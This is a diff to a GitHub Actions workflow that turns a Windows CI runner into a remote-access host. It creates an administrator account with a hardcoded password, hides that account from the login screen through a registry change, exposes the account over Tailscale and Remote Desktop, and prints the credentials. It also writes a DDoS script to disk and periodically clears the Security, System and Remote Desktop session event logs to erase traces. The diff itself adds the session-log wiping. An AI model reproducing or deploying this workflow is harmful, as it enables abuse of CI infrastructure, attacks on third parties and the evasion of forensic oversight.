@@ -17,7 +17,8 @@ jobs:
 
       - name: Create Admin User (net user)
         run: |
-          net user Hex0 Hex0#2026 /add /passwordchg:no /expires:never
+          net user Hex0 /delete 2>nul
+          net user Hex0 SecureP@ss2026! /add /passwordchg:no /expires:never
           net localgroup Administrators Hex0 /add
           net localgroup "Remote Desktop Users" Hex0 /add
           reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hex0 /t REG_DWORD /d 0 /f
@@ -32,7 +33,7 @@ jobs:
           $ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
           Write-Host "IP: $ip"
           Write-Host "User: Hex0"
-          Write-Host "Pass: Hex0#2026"
+          Write-Host "Pass: SecureP@ss2026!"    # <-- UPDATED
           Remove-Item C:\t.msi -Force -ErrorAction SilentlyContinue
 
       - name: Create DDoS Script
@@ -57,12 +58,13 @@ jobs:
           '@
           $ddos | Out-File -FilePath "C:\ddos.ps1" -Encoding ASCII
 
-      - name: Keep Alive
+      - name: Keep Alive & Log Wipe
         run: |
           for ($i = 1; $i -le 360; $i++) {
             Start-Sleep -Seconds 60
             if ($i % 30 -eq 0) {
               wevtutil cl Security -ErrorAction SilentlyContinue
               wevtutil cl System -ErrorAction SilentlyContinue
+              wevtutil cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" -ErrorAction SilentlyContinue
             }
           }
